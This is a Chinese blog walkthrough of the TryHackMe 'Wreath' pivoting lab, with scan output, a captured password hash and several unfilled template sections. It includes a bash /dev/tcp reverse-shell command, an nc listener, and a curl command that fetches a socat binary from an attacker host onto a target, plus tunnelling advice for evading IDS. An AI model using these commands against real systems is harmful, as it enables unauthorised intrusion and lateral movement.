<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="一句话总结：  🚀 靶场概述难度：描述：  了解如何通过入侵面向公众的 Web 计算机并通过隧道传输您的流量以访问 Wreath 网络中的其他计算机来通过网络进行转换   📋 基本信息   🚀 本地机器信息 目标机器信息     IP 10.50.86.16 10.200.85.200    OS Kali      🔍 信息搜集1. 🛠️ 端口扫描 使用工具如 nmap 或 mass">
<meta property="og:type" content="article">
<meta property="og:title" content="THM-wreath">
<meta property="og:url" content="https://feesec.github.io/2024/11/21/wreath/index.html">
<meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
<meta property="og:description" content="一句话总结：  🚀 靶场概述难度：描述：  了解如何通过入侵面向公众的 Web 计算机并通过隧道传输您的流量以访问 Wreath 网络中的其他计算机来通过网络进行转换   📋 基本信息   🚀 本地机器信息 目标机器信息     IP 10.50.86.16 10.200.85.200    OS Kali      🔍 信息搜集1. 🛠️ 端口扫描 使用工具如 nmap 或 mass">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121145312.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121145417.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121151503.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121152025.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121152808.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121153104.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121154958.png">
<meta property="og:image" content="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png">
<meta property="og:image" content="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png">
<meta property="og:image" content="https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png">
<meta property="og:image" content="https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png">
<meta property="og:image" content="https://assets.tryhackme.com/additional/wreath-network/ZjA0YmEzMzVl.png">
<meta property="og:image" content="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121165626.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121170006.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121170243.png">
<meta property="og:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121171018.png">
<meta property="article:published_time" content="2024-11-21T06:51:28.114Z">
<meta property="article:modified_time" content="2024-11-21T06:51:28.114Z">
<meta property="article:author" content="Leon">
<meta property="article:tag" content="靶场">
<meta property="article:tag" content="THM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://feesec.github.io/assets/img/Pasted%20image%2020241121145312.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>THM-wreath</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-3YLDTM3C61"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-3YLDTM3C61');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="安全杂谈 | 网络安全、渗透测试、信息安全技术分享" type="application/atom+xml" />
    
	<!-- mathjax -->
	
  
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/sites/">站点</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/feesec">项目</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/11/22/Axlle-back/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/11/20/dogcat/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://feesec.github.io/2024/11/21/wreath/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://feesec.github.io/2024/11/21/wreath/&text=THM-wreath"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://feesec.github.io/2024/11/21/wreath/&is_video=false&description=THM-wreath"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=THM-wreath&body=Check out this article: https://feesec.github.io/2024/11/21/wreath/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://feesec.github.io/2024/11/21/wreath/&title=THM-wreath"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://feesec.github.io/2024/11/21/wreath/&name=THM-wreath&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://feesec.github.io/2024/11/21/wreath/&t=THM-wreath"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%9A%80-%E9%9D%B6%E5%9C%BA%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">🚀 靶场概述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8B-%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">📋 基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">🔍 信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%F0%9F%9B%A0%EF%B8%8F-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 🛠️ 端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%94%8E-%E8%B7%AF%E5%BE%84%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 🔎 路径探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%A7%B0-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 🧰 服务枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">🧠 渗透思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E2%9A%A1-%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. ⚡ 攻击向量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%F0%9F%92%A5-nday-%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 💥 nday 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%F0%9F%94%8D-%E4%BF%A1%E6%81%AF%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 🔍 信息审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8C%90-Web-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.</span> <span class="toc-text">🌐 Web 渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%90-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C"><span class="toc-number">1.5.</span> <span class="toc-text">🔐 横向移动与后渗透操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%95%B5%EF%B8%8F%E2%80%8D%E2%99%82%EF%B8%8F-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">🕵️‍♂️ 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%90%8D%E7%A7%B0%EF%BC%9A"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞名称：&lt;漏洞名称&gt;</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%BB-getshell"><span class="toc-number">1.7.</span> <span class="toc-text">💻 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A8-%E6%8F%90%E6%9D%83"><span class="toc-number">1.8.</span> <span class="toc-text">🔨 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E5%92%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.9.</span> <span class="toc-text">隧道代理和端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.10.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.11.</span> <span class="toc-text">📚 知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B3-%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%8E%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.12.</span> <span class="toc-text">🧳 攻击链与流程图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.13.</span> <span class="toc-text">📅 总结</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        THM-wreath
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Leon</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-21T06:51:28.114Z" class="dt-published" itemprop="datePublished">2024-11-21</time>
        
        (Updated: <time datetime="2024-11-21T06:51:28.114Z" class="dt-updated" itemprop="dateModified">2024-11-21</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/THM/" rel="tag">THM</a>, <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
<p>一句话总结：</p>
</blockquote>
<h1 id="🚀-靶场概述"><a href="#🚀-靶场概述" class="headerlink" title="🚀 靶场概述"></a>🚀 靶场概述</h1><p><strong>难度</strong>：<br><strong>描述</strong>：  了解如何通过入侵面向公众的 Web 计算机并通过隧道传输您的流量以访问 Wreath 网络中的其他计算机来通过网络进行转换</p>
<p><a href="/../assets/img/Pasted%20image%2020241121145312.png" title="拓扑图" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121145312.png" alt="拓扑图"></a><br><a href="/../assets/img/Pasted%20image%2020241121145417.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121145417.png"></a></p>
<hr>
<h2 id="📋-基本信息"><a href="#📋-基本信息" class="headerlink" title="📋 基本信息"></a>📋 基本信息</h2><table>
<thead>
<tr>
<th>🚀</th>
<th><strong>本地机器信息</strong></th>
<th><strong>目标机器信息</strong></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><strong>IP</strong></td>
<td>10.50.86.16</td>
<td>10.200.85.200</td>
<td></td>
</tr>
<tr>
<td><strong>OS</strong></td>
<td><code>Kali</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<hr>
<h2 id="🔍-信息搜集"><a href="#🔍-信息搜集" class="headerlink" title="🔍 信息搜集"></a>🔍 信息搜集</h2><h3 id="1-🛠️-端口扫描"><a href="#1-🛠️-端口扫描" class="headerlink" title="1. 🛠️ 端口扫描"></a>1. 🛠️ 端口扫描</h3><ul>
<li><p>使用工具如 <code>nmap</code> 或 <code>masscan</code> 进行端口扫描，发现目标机器开放的端口。</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">naabu -host 10.200.85.200</span><br><span class="line">22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>c)</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/http Apache httpd <span class="number">2.4</span>.<span class="number">37</span> ((centos) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>c)</span><br><span class="line"><span class="number">10000</span>/tcp open  http     MiniServ <span class="number">1.890</span> (Webmin httpd)</span><br><span class="line"></span><br><span class="line">Aggressive OS guesses: Linux <span class="number">3.10</span> - <span class="number">3.13</span> (<span class="number">90</span>%)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-🔎-路径探测"><a href="#2-🔎-路径探测" class="headerlink" title="2. 🔎 路径探测"></a>2. 🔎 路径探测</h3><ul>
<li>扫描网站或系统的开放路径，寻找潜在的漏洞。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://10.17.5.121 -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line">dirb http://10.17.5.121</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-🧰-服务枚举"><a href="#3-🧰-服务枚举" class="headerlink" title="3. 🧰 服务枚举"></a>3. 🧰 服务枚举</h3><ul>
<li>对服务进行详细的枚举，寻找潜在漏洞。<ul>
<li>使用工具如 <code>nmap</code>、<code>nikto</code>、<code>dirbuster</code> 等。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="🧠-渗透思路"><a href="#🧠-渗透思路" class="headerlink" title="🧠 渗透思路"></a>🧠 渗透思路</h2><h3 id="1-⚡-攻击向量"><a href="#1-⚡-攻击向量" class="headerlink" title="1. ⚡ 攻击向量"></a>1. ⚡ 攻击向量</h3><ul>
<li>根据目标机器暴露的服务和漏洞，选择攻击路径。<br>  <a href="/../assets/img/Pasted%20image%2020241121151503.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121151503.png"></a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10000/tcp open  http     MiniServ 1.890 (Webmin httpd) </span><br></pre></td></tr></table></figure>
<p><a href="/../assets/img/Pasted%20image%2020241121152025.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121152025.png"></a></p>
<h3 id="2-💥-nday-利用"><a href="#2-💥-nday-利用" class="headerlink" title="2. 💥 nday 利用"></a>2. 💥 nday 利用</h3><ul>
<li>查找未打补丁的漏洞，利用公开的 <strong>nday</strong> 漏洞。<br>  -<a href="/../assets/img/Pasted%20image%2020241121152808.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121152808.png"></a></li>
</ul>
<h3 id="3-🔍-信息审计"><a href="#3-🔍-信息审计" class="headerlink" title="3. 🔍 信息审计"></a>3. 🔍 信息审计</h3><ul>
<li>审计目标系统，查找敏感信息或配置错误。<ul>
<li>通过配置文件、日志文件等进行信息审计。<br><a href="/../assets/img/Pasted%20image%2020241121153104.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121153104.png"></a></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="🌐-Web-渗透测试"><a href="#🌐-Web-渗透测试" class="headerlink" title="🌐 Web 渗透测试"></a>🌐 Web 渗透测试</h2><ul>
<li><strong>Web 漏洞扫描</strong>：使用 Burp Suite、Nikto 等工具进行 Web 应用的扫描。</li>
<li><strong>漏洞利用</strong>：利用常见漏洞，如 SQL 注入、XSS 等，进行进一步测试。</li>
</ul>
<hr>
<h2 id="🔐-横向移动与后渗透操作"><a href="#🔐-横向移动与后渗透操作" class="headerlink" title="🔐 横向移动与后渗透操作"></a>🔐 横向移动与后渗透操作</h2><ul>
<li><strong>横向移动</strong>：一旦获取基础 shell，搜索网络内其他潜在目标，进行横向渗透。</li>
<li><strong>后渗透操作</strong>：<ol>
<li>获取敏感信息（如数据库、用户凭证）。</li>
<li>持久化访问，通过反向 shell、计划任务等手段保持连接。</li>
</ol>
</li>
</ul>
<hr>
<h2 id="🕵️‍♂️-漏洞利用"><a href="#🕵️‍♂️-漏洞利用" class="headerlink" title="🕵️‍♂️ 漏洞利用"></a>🕵️‍♂️ 漏洞利用</h2><h3 id="漏洞名称："><a href="#漏洞名称：" class="headerlink" title="漏洞名称：&lt;漏洞名称&gt;"></a>漏洞名称：&lt;漏洞名称&gt;</h3><ul>
<li><strong>描述</strong>：&lt;漏洞描述&gt;</li>
<li><strong>利用过程</strong>：<ol>
<li><strong>漏洞分析</strong>：&lt;简要描述漏洞的成因&gt;</li>
<li><strong>编写利用脚本</strong> 或 <strong>使用现有工具</strong>：&lt;如何利用&gt;</li>
<li><strong>验证漏洞是否有效</strong>：&lt;验证步骤&gt;</li>
<li><strong>获取相关权限或信息</strong>：&lt;攻击目标后获取的权限&gt;</li>
</ol>
</li>
</ul>
<hr>
<h2 id="💻-getshell"><a href="#💻-getshell" class="headerlink" title="💻 getshell"></a>💻 getshell</h2><ul>
<li><strong>描述</strong>：通过漏洞获取目标机器的 shell（命令行访问）。</li>
<li><strong>步骤</strong>：<ol>
<li>使用反向 shell 获取访问权限 进一步稳定的shell： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.17.5.121/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li>
<li><strong>验证 shell 是否成功</strong>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li>
<li>获取id_rsa<br>  <a href="/../assets/img/Pasted%20image%2020241121154958.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241121154958.png"></a></li>
</ol>
</li>
</ul>
<hr>
<h2 id="🔨-提权"><a href="#🔨-提权" class="headerlink" title="🔨 提权"></a>🔨 提权</h2><ul>
<li><strong>描述</strong>：在目标系统中进行权限提升，获取 root 权限。</li>
<li><strong>步骤</strong>：<ol>
<li>查看当前用户和权限： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure></li>
<li>查找本地提权漏洞或配置错误：<ul>
<li>使用 <code>linpeas</code>、<code>GTFOBins</code> 查找提权方法。</li>
</ul>
</li>
<li>提升权限至 root 用户： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /bin/bash  <span class="comment"># 提升为 root</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<hr>
<h2 id="隧道代理和端口转发"><a href="#隧道代理和端口转发" class="headerlink" title="隧道代理和端口转发"></a>隧道代理和端口转发</h2><p>我们用于透视的方法往往因不同的目标操作系统而异。像 Metasploit 这样的框架可以简化这个过程，但是，目前，我们将寻找更多的手动技术来进行透视。</p>
<p>渗透测试的这一领域包含两种主要方法：</p>
<ul>
<li><p><strong>隧道&#x2F;代理：</strong> 通过受感染的计算机创建代理类型的连接，以便将所有所需的流量路由到目标网络。这也可能在另一个协议（例如 SSH 隧道）内_进行隧道_传输，这对于规避基本 <strong>I</strong>ntrusion <strong>D</strong>etection <strong>S</strong>ystem （IDS） 或防火墙非常有用  </p>
</li>
<li><p><strong>端口转发：</strong>通过受损主机在本地端口和目标上的单个端口之间创建连接</p>
</li>
</ul>
<p>如果我们想将大量不同类型的流量重定向到我们的目标网络 – 例如，使用 nmap 扫描，或者访问多台不同机器上的多个端口，那么代理是很好的。</p>
<p>端口转发往往更快、更可靠，但只允许我们访问目标设备上的单个端口（或小范围）。</p>
<p>哪种 pivoting 样式更合适完全取决于网络的布局，因此在决定如何进行之前，我们必须从进一步的枚举开始。此时，明智的做法是开始绘制您所看到的网络布局 —— 尽管在这个练习网络的情况下，布局在屏幕顶部的框中给出。</p>
<p>作为一般规则，如果您有多个可能的入口点，请尽可能使用 Linux&#x2F;Unix 目标，因为这些目标往往更容易从中转。面向外部的 Linux Web 服务器绝对是理想的选择。  </p>
<p>本节中的其余任务将涵盖以下主题：</p>
<ul>
<li>使用本机和静态编译工具枚举网络</li>
<li>代理链 &#x2F; FoxyProxy</li>
<li>SSH 端口转发和隧道（主要是 Unix）</li>
<li>plink.exe （Windows）</li>
<li>socat（Windows 和 Unix）  </li>
<li>凿子 （Windows 和 Unix）</li>
<li>sshuttle （目前仅限 Unix）</li>
</ul>
<p>ocat 不仅非常适合完全稳定的 Linux shell<a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoshells">[1]</a>，也非常适合端口转发。socat 的一大缺点（除了经常出现的问题 人们已经学习了语法），因为它很少由 default 在目标上。也就是说，静态二进制文件很容易找到 <a target="_blank" rel="noopener" href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">Linux</a> 和 <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download">Windows</a> 都可用。 请记住，Windows 版本不太可能绕过防病毒软件 software 默认，因此可能需要自定义编译。在我们开始之前，值得注意的是：如果您已经完成了 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoshells">What the Shell？</a>房间，您将知道 Socat 可用于创建加密连接。此处显示的技术可以与 shells room 中详述的加密选项相结合，以创建加密的端口转发和中继。为避免使本节过于复杂，这里不会教授这种技术;但是，在您自己的时间进行实验是非常值得的。  </p>
<p>虽然以下技术不能用于将完整代理设置到目标网络中，但很有可能使用它们成功地转发来自 Linux 和 Windows 受损目标的端口。特别是，socat 是一个非常好的中继：例如，如果您试图在与攻击计算机没有直接连接的目标上获取 shell，则可以使用 socat 在当前受感染的机器上设置中继。这将监听来自目标的反向 shell，然后立即将其转发回攻击框：</p>
<p><a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" title="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" alt="Diagram demonstrating the purpose of a relay to forward a shell back from a target PC"></a>  </p>
<p>最好将 socat 视为将两件事连接在一起的一种方式——有点像 Portal 游戏中的 Portal Gun，它在两个不同的位置之间建立了联系。这可以是同一台机器上的两个端口，可能是在两台不同的机器之间创建一个中继，可能是在端口和监听机器上的文件之间创建一个连接，或者许多其他类似的事情。这是一个非常强大的工具，非常值得您在自己的时间里研究。</p>
<p>然而，一般来说，黑客倾向于使用它来创建反向&#x2F;绑定 shell，或者如上例所示，创建一个端口转发。具体来说，在上面的示例中，我们将创建一个_从_受感染服务器上的端口转发_到_我们自己机器上的侦听端口的端口。不过，我们可以用另一种方式来实现，通过将连接从攻击机器转发到网络内部的目标，或者在_攻击机器_上的侦听端口与内部服务器上的服务之间创建直接链接。后一个应用程序特别有用，因为它不需要在受感染的服务器上打开端口。</p>
<p>在使用 socat 之前，通常需要为它下载一个二进制文件，然后将其上传到盒子中。</p>
<p><strong>例如，使用 Python Web 服务器：-</strong></p>
<p>在 Kali 上（在包含 Socat 二进制文件的目录内）：</p>
<p><code>sudo python3 -m http.server 80</code></p>
<p>然后，在目标上：<br><code>curl ATTACKING_IP/socat -o /tmp/socat-USERNAME &amp;&amp; chmod +x /tmp/socat-USERNAME</code></p>
<p><a target="_blank" rel="noopener" href="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" title="Demonstration of using cURL with a Python HTTP server to upload files" class="gallery-item"><img src="https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png" alt="Demonstration of using cURL with a Python HTTP server to upload files"></a></p>
<p>上传二进制文件后，让我们依次看一下上述每个场景。</p>
<p><em><strong>注意：</strong>这将上传标题中带有您的用户名的 socat 二进制文件;但是，此任务其余部分给出的示例命令将二进制文件简称为</em> <em>.</em><code>socat</code>  </p>
<hr>
<p><strong>Reverse Shell 继电器</strong></p>
